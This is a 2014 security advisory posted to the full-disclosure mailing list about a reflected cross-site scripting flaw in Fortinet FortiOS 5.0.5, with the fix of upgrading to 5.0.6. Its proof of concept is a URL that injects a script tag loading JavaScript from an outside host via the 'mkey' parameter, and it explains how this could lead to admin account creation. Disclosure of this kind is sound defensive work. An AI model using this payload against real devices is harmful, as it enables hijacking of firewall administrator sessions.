
Date: Mon, 3 Feb 2014 21:11:49 -0200
From: William Costa <william.costa@...il.com>
To: "full-disclosure@...ts.grok.org.uk" <full-disclosure@...ts.grok.org.uk>
Subject: Fortinet FortiOS 5.0.5 contains a reflected
 cross-site scripting (XSS) vulnerability ( CVE-2013-7182)

I. VULNERABILITY

-------------------------

Reflected XSS Attacks vulnerabilities in FortiOS 5.0.5



II. BACKGROUND

-------------------------

Fortinet's industry-leading, Network Security Platforms deliver Next
Generation Firewall (NGFW) security with exceptional throughput, ultra
low latency, and multi-vector threat protection.



III. DESCRIPTION

-------------------------

Has been detected a Reflected XSS vulnerability in FortiOS in 5.0.5.

The code injection is done through the parameter "mkey" in the page
/firewall/schedule/recurrdlg"



IV. PROOF OF CONCEPT

-------------------------

The application does not validate the parameter "mkey" correctly.



http://IP_FORTIGATE/firewall/schedule/recurrdlg?mkey=a"><SCRIPT
SRC="http://10.0.1.120/xss/good.js"></SCRIPT>

 V. BUSINESS IMPACT
-------------------------
An attacker can execute arbitrary HTML or script code in a
targeteduser's browser, , that allows the execution of arbitrary
HTML/script code to be executed in the context of the victim user's
browser allowing theft CSRF token, thus enabling the creation of a
Administrator User in box for full access





VI. SYSTEMS AFFECTED
-------------------------
Try FortiOS v5.0.5 VM and Applaince



VII. SOLUTION
------------------------

Upgrade to FortiOS 5.0.6 or higher.

References

http://www.fortiguard.com/advisory/FG-IR-14-003/http://www.kb.cert.org/vuls/id/728638



By William Costa

Content of type "text/html" skipped

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
